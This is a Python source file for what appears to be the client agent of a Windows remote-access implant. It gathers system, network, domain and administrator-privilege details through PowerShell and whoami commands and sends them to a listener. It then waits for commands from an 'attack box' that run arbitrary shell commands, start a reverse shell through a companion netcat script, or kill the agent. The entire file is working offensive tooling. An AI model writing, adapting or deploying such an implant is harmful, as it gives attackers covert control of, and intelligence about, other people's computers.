# Imports

import signal
import argparse
import socket
import subprocess
import sys
import threading
import os
import psutil
import time
from win32com.shell import shell
exit_event = threading.Event()



# Reverse shell function

def startrevshellcli():
    script_path = os.path.join(os.path.dirname(__file__), "netcatClient.py")

    subprocess.call([sys.executable, script_path])

    exit_event.set()


# Defines client reciever for commands coming from attack box
def reciever(client):
    while True:
        try:
            #this checks to see if the agent is still alive and receiving data
            data=client.recv(1024)
        except:
            print("[-] Connection to server lost.")
            client.close()
            os._exit(0) 
        data=data.decode('UTF-8') #get the commands we're sending from the attacker box
        
        if ":msg:" in data:
            print(data)
    
        if ":whoami:" in data:
            whoami=os.getlogin()
            client.send(whoami.encode())
       
        if ":shell:" in data: #start the reverse shell!
            exit_event.clear()
            
            handler_thread2 = threading.Thread(target=startrevshellcli)
            handler_thread2.daemon = True
            handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
        if "ifconfig" in data: # gets public ip
            command=data.split("\n")
            command=command[1]
            print("command: ", command)
            proc = subprocess.Popen(command,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
            client.send(b"returned output: \n"+proc.stdout.read())
            proc.stdin.close()
            proc.terminate()
            
        if "self-destruct" in data: # Kills agent
            client.close()
            os._exit(0) 
        

host="127.0.0.1"
port=4545

Domain= False # Boolean
Admin = False # Boolean

# This runs a powershell command. It returns the following:
#   # OS Name: 
#   # OS Version:
#   # Build Number:
#   # OS Architecture:
#   # Install Date:
#   # Sytstem Directory:

osinfo=subprocess.run("powershell.exe -command Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | findstr Microsoft",
                       capture_output=True, text=True)
# This strips the output down too the caption and version fields
osinfo=osinfo.stdout.strip()

try:
    # This runs a powershell command. It returns the following:
    #   # IP Address:
    #   # Loopback Address:
    #   # self-assigned address when DHCP is unavailable
    ipaddrinfo=subprocess.run("powershell.exe -command (Get-NetIPAddress -AddressFamily IPv4).IpAddress | findstr /V 169. | findstr /V 127.0.0.1", 
                              capture_output=True, text=True)
    ipaddrinfo=ipaddrinfo.stdout.strip()    
except:
    ipaddrinfo="No IP addresses found"

try:
    # Runs a powershell command. It is to determine if the machine is on a domain.
    domaininfo=subprocess.run("whoami /FQDN", capture_output=True, text=True)
    # Returns useful readable information 
    domaininfo = domaininfo.stdout.strip()
    if "Unable" in domaininfo.stderr:
        Domain = False
        print("[-] NOT within a domain!")
    else:
        print("[+] Within a domain!")
        Domain = True
except:
    print("[!] unexpected error...")

# Extracts the username of current user
gathering=subprocess.run("net user " + os.environ.get('USERNAME'), capture_output=True, text=True)

if "Administrators" in gathering.stdout:
    print("Administrative Privileges!")
    Admin = True


if Domain == True:    
    info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
else:
    info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port)) # Connects using port and IP address

# INFO SENT TO SERVER:
# if Domain == True:    
#    info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) +
#  "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "Domain Info: 
# " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
# else:
#    info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin())
#  + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "OS info: " + osinfo
#  +"\n" + "IP address info: " + "\n" + ipaddrinfo

handler_thread = threading.Thread(target=reciever, args=(client, ))
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)

